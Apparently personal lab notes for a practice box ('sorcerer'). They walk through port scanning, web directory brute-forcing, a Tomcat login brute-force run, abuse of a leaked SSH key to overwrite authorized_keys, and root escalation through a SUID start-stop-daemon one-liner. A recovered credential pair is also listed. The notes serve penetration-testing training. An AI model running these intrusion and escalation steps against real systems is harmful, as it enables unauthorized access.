### Enumeration
```
IP=192.168.170.100
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,111,2049,7742,8080,34541,34965,43085,51007 -A $IP
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	- nc -nv $IP 22
		- SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
- 80
	- nginx
	- nc -nv $IP 80
		- http open unknown
- 111
	- rpcbind  2-4
	- nc -nv $IP 111
		- sunrpc
- 2049
	- nfs      3-4 (RPC #100003)
	- nc -nv $IP 2049
		- nfs
- 7742
	- nginx
	- nc -nv $IP 7742
		- unknown
- 8080
	- Apache Tomcat 7.0.4
	- nc -nv $IP 8080
		- http-alt
- 34541
	- mountd   1-3 RPC
	- nc -nv $IP 34541
		- unknown
- 34965
	- nlockmgr 1-4 RPC
	- nc -nv $IP 34965
		- unknown
- 43085
	- mountd   1-3 RPC
	- nc -nv $IP 43085
		- unknown
- 51007
	- mountd   1-3 RPC
	- nc -nv $IP 51007
		- unknown
### Foothold
- RPC/ SMB
	- enum4linux -U $IP
		- nothing
- 2049
	- sudo nmap --script nfs-* $IP
		- no NFS mounts available
- 80
	- Default landing page
		- ![[Pasted image 20240717090817.png]]
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
- 7742
	- Default landing page
		- ![[Pasted image 20240717090828.png]]
	- Login
		- ![[Pasted image 20240717090935.png]]
		- Burp
			- Does not send login req to burp
		- Source code makes it seem that all logins popup invalid login
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
			- /default
				- 404 not found
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP:7742
			- /zipfiles
				- francis.zip
					- nothing
				- max.zip
					- scp_wrapper.sh
						- ![[Pasted image 20240717093243.png]]
					- .ssh
						- id_rsa
							- ssh -i max/max/.ssh/id_rsa max@$IP
								- runs the scp_wrapper.sh script 
								- ![[Pasted image 20240717093414.png]]
								- ssh2john max/max/.ssh/id_rsa > max_id_rsa.hash
									- no password
						- id_rsa.pub
						- authorized_keys
							- ![[Pasted image 20240717093519.png]]
							- auto runs the scp_wrapper.sh script on ssh connect
							- Remove everything before ssh-rsa
						- scp -i ~/OSCP/boxes/sorcerer/max/max/.ssh/id_rsa -O ~/OSCP/boxes/sorcerer/max/max/.ssh/authorized_keys max@$IP:/home/max/.ssh/authorized_keys
							- This overwrite the old authorized_keys 
						- ![[Pasted image 20240717100753.png]]
					- tomcat-users.xml.bak
						- tomcat:VTUD2XxJjf5LPmu6
						- ssh tomcat@$IP
							- need public key
				- miriam.zip
					- nothing
				- sofia.zip
					- nothing
				- Downloaded and unzipped all files
- 8080
	- Default landing page
		- ![[Pasted image 20240717090838.png]]
	- Versions
		- tomcat 7.0.4
	- Login brute
		- python3 mgr_brute.py -U http://192.168.170.100:8080/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
			- not found
	- Directory Brute force
		- dirsearch -u http://$IP
			- /manager
				- 403 forbidden
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP:8080/FUZZ
			- /manager
		- Found directories
### PE
#### Linux
- max
	- id
		- uid=1003(max) gid=1003(max) groups=1003(max)
	- sudo -l
		- sudo: command not found
	- uname -a
		- Linux sorcerer 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- none
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- start-stop-daemon
			- gtfobins: `./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p`
			- `/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p`
				- Rooted
	- Users with console
	- netstat -ano
		- Active ports
	- linpeas
		- Possible Exploits
		- Interesting Files
### Credentials
- tomcat:VTUD2XxJjf5LPmu6
### Lessons Learned
- scp can work if ssh login is not working